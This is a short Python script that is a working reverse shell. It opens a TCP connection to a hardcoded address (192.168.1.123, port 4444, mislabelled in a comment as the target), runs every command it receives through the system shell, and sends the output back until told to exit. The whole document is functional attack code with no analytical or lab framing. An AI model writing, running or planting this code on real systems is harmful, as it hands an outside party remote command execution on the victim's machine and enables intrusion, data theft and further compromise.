import socket
import subprocess

def reverse_shell(ip,port):
    sock= socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    sock.connect((ip,port))
    while True:
        command = sock.recv(1024).decode('utf-8')
        if command == 'exit':
            break
        output= subprocess.run(command,shell=True,capture_output=True)
        sock.send(output.stdout)
    sock.close()

target_ip = '192.168.1.123'  #Ip address of the target 
targer_port= 4444    # target port number 

reverse_shell(target_ip,targer_port)